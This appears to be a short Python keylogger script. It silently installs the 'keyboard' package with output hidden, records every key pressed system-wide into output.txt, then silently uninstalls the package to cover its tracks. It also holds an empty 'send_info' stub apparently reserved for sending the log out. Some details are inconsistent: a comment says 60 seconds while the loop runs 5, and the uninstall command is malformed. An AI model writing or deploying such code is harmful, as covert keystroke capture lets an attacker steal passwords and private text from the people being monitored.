import os

os.system("pip install keyboard > nul 2>&1")

import keyboard
import time

# Record key names for a maximum of 60 seconds
start_time = time.time()
recorded_keys = []

while time.time() - start_time < 5:
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_DOWN:
        recorded_keys.append(event.name)

# Write the recorded key names to a file named output.txt

def input_filter(raw):
    return raw

def send_info(file):
    pass

with open('output.txt', 'w') as file:
    recorded_keys = input_filter(recorded_keys)
    for key_name in recorded_keys:
        file.write(f"{key_name}")

os.system("pip uninstall keyboard | Y > nul 2>&1")
